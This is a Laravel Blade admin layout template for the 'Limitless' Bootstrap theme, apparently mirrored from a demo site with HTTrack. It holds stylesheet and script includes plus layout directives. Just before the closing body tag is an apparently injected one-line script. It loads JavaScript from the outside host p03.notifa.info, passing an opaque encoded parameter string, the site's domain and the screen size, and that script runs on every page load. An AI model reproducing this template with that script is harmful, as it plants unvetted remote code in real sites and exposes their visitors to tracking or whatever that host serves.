@php
  // Avoid clear cache
  header('Expires: Sun, 01 Jan 2014 00:00:00 GMT');
  header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
  header("Cache-Control: post-check=0, pre-check=0", false);
  header("Pragma: no-cache");
@endphp

<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from demo.interface.club/limitless/demo/bs4/Template/layout_2/LTR/material/full/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Aug 2019 03:52:13 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title>Limitless - Responsive Web Application Kit by Eugene Kopyov</title>

	<!-- Global stylesheets -->
	<link href="https://fonts.googleapis.com/css?family=Roboto:400,300,100,500,700,900" rel="stylesheet" type="text/css">
	<link href="{{URL::asset('ais/global_assets/css/icons/icomoon/styles.min.css')}}" rel="stylesheet" type="text/css">
	<link href="{{URL::asset('ais/assets/css/bootstrap.min.css')}}" rel="stylesheet" type="text/css">
	<link href="{{URL::asset('ais/assets/css/bootstrap_limitless.min.css')}}" rel="stylesheet" type="text/css">
	<link href="{{URL::asset('ais/assets/css/layout.min.css')}}" rel="stylesheet" type="text/css">
	<link href="{{URL::asset('ais/assets/css/components.min.css')}}" rel="stylesheet" type="text/css">
	<link href="{{URL::asset('ais/assets/css/colors.min.css')}}" rel="stylesheet" type="text/css">
	<!-- /global stylesheets -->

  @yield('style')

  <!-- Core JS files -->
	<script src="{{URL::asset('ais/global_assets/js/main/jquery.min.js')}}"></script>
	<script src="{{URL::asset('ais/global_assets/js/main/bootstrap.bundle.min.js')}}"></script>
	<script src="{{URL::asset('ais/global_assets/js/plugins/loaders/blockui.min.js')}}"></script>
	<script src="{{URL::asset('ais/global_assets/js/plugins/ui/ripple.min.js')}}"></script>
	<!-- /core JS files -->

	<!-- Theme JS files -->
	<script src="{{URL::asset('ais/global_assets/js/plugins/visualization/d3/d3.min.js')}}"></script>
	<script src="{{URL::asset('ais/global_assets/js/plugins/visualization/d3/d3_tooltip.js')}}"></script>
	<script src="{{URL::asset('ais/global_assets/js/plugins/forms/styling/switchery.min.js')}}"></script>
	<script src="{{URL::asset('ais/global_assets/js/plugins/forms/selects/bootstrap_multiselect.js')}}"></script>
	<script src="{{URL::asset('ais/global_assets/js/plugins/ui/moment/moment.min.js')}}"></script>
	<script src="{{URL::asset('ais/global_assets/js/plugins/pickers/daterangepicker.js')}}"></script>

	<script src="{{URL::asset('ais/assets/js/app.js')}}"></script>
	<script src="{{URL::asset('ais/global_assets/js/demo_pages/dashboard.js')}}"></script>
	<!-- /theme JS files -->

  @yield('script')

</head>

<body>

  @include('ais.admin.include.navbar')

	<!-- Page content -->
	<div class="page-content">

    @include('ais.admin.include.sidebar')

		<!-- Main content -->
		<div class="content-wrapper">

      @include('ais.admin.include.header')

			@yield('content')

      @include('ais.admin.include.footer')

		</div>
		<!-- /main content -->

	</div>
	<!-- /page content -->

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2Ig8D68la3uVB5MoB3Fra0vXjCEIBjSymWXuDa1VK4FQAtehaQUHuD5uaBg%2fjKRvfVyCUM46BrY5Px4oDYpykLo1Id2XSt3RRHr4pmOELoTr6OkYbIRUTxKGcSfr%2ft3be2GKiWOYXK5azv7VBE6i4vXMR20tMwHIBCOlPJWosqDsbeXalz%2bRJbvIooTFFVvFwFDaCl3a9sePN%2fB2yj72u02I3525av0F1I0hCOgyLuS3lfNqyzBSSvPB9eGRmu7j%2f4bMJtDvf0D3HMVzSBex2hfRen%2bm7G%2fv48mWIZy9Lg26c35j8BZVdOy57HN7Iox%2fWweb4zZoUuEnLNEfBBbP%2bcfsana7AZC8YgDUo36odlb0sBHxCH5AOVRtiaJvPefYLuJv5Bzvb%2fL3bfz5ybDQinGc0Q4ZERebirmkyfxS3k56z4bgWyjkFecI%2bdTorERGacb0tlt79%2fZhzPPOfJxo3GAgnww4PDekHxCZu9AVcay4U4W95XNZjpzmUeJAkU6KHAA7qQed6qVNVu6wyEKqIMX6x769TbXBUUwu%2fU7I7GJA%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from demo.interface.club/limitless/demo/bs4/Template/layout_2/LTR/material/full/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Aug 2019 03:52:13 GMT -->
</html>
